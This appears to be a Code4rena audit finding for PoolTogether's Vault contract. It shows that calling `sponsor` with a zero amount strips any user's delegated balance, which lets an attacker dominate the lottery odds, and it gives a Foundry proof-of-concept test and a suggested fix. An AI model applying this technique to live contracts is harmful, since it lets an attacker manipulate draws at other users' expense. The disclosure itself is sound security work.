# Original link
https://github.com/code-423n4/2023-07-pooltogether-findings/issues/351
# Lines of code

https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L982-L994


# Vulnerability details

## Impact
The `sponsor` function in the `Vault.sol` contract allows anyone to remove another user's delegation by forcing them to delegate to the sponsor address. `_sponsor` will deposit some amount from the caller for the target user and then force a delegation to the sponsor address (`address(1)`).

However, this amount can just be 0 and so it becomes a function to simply force a removal of a delegation. The full delegated power gets removed, because delegations to the sponsor address are not tracked.

As such, it becomes possible to call `sponsor` for every user and make the total delegated power supply in the TwabController equal to 0.
The attacker can then be the only one with some delegated amount that is equal to 100% of the total supply, manipulating the process of the lottery.

Rectifying the delegation requires manual interaction from the user and the exploit can be repeated anytime, continuously, further manipulating the values in the TwabController.

## Proof of Concept
```
function testPoCDelegateRemoval() public {
    address SPONSORSHIP_ADDRESS = address(1);
    uint96 BALANCE = 100_000_000 ether;

    token.approve(address(vault), BALANCE);
    vault.deposit(BALANCE, address(this));

    assertEq(address(this), twab_controller.delegateOf(address(vault), address(this)));
    assertEq(BALANCE, twab_controller.delegateBalanceOf(address(vault), address(this)));

    // As attacker, call sponsor with 0 amount and victim address
    vm.prank(address(0xdeadbeef));
    vault.sponsor(0, address(this));

    // Delegated balance is now gone
    assertEq(SPONSORSHIP_ADDRESS, twab_controller.delegateOf(address(vault), address(this)));
    assertEq(0, twab_controller.delegateBalanceOf(address(vault), address(this)));
    assertEq(0, twab_controller.delegateBalanceOf(address(vault), SPONSORSHIP_ADDRESS));
}
```

## Tools Used

Manual review, VSCode, Foundry.

## Recommended Mitigation Steps

The `sponsor` function should only accept deposits if the receiver has already delegated to the sponsorship address. Or otherwise, the deposit is accepted, but the delegation should not be forced.


## Assessed type

Other